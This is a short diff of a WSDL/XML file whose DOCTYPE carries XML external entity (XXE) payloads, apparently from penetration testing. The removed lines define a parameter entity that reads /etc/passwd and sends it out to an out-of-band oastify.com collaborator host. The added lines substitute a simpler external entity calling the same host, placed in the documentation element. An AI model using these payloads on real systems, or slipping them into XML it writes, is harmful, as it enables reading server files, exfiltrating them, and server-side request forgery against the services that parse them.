@@ -1,10 +1,7 @@
 <?xml version="1.0"?>
 <!DOCTYPE wsdl:definitions [
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://rd87jv1truvho7pt2ukts1etikobc27qw.oastify.com/?d1=%file;'>">
-  %param1;
-  %exfil;
+  <!ENTITY xxe SYSTEM "http://rd87jv1truvho7pt2ukts1etikobc27qw.oastify.com">
 ]>
 <wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
-  <wsdl:documentation>test</wsdl:documentation>
+  <wsdl:documentation>&xxe;</wsdl:documentation>
 </wsdl:definitions>
